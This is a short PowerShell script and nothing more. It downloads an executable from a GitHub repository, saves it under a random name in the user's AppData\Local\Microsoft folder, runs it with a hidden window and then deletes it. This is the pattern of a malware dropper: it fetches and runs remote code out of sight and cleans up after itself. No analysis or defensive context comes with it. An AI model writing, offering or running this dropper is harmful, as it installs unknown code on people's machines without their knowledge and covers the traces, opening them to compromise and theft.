$exeUrl = "https://github.com/xxuavails/diagnosis/raw/refs/heads/main/Meseg.exe";
$tmpPath = "$env:USERPROFILE\AppData\Local\Microsoft\$(New-Guid).exe";

try {
    $wc = New-Object System.Net.WebClient;
    $wc.DownloadFile($exeUrl, $tmpPath);

    $p = Start-Process -FilePath $tmpPath -WindowStyle Hidden -PassThru;
    $p.WaitForExit();

    Remove-Item $tmpPath -Force -ErrorAction SilentlyContinue;
} catch {
    Write-Error "Execution failed: $_";
}






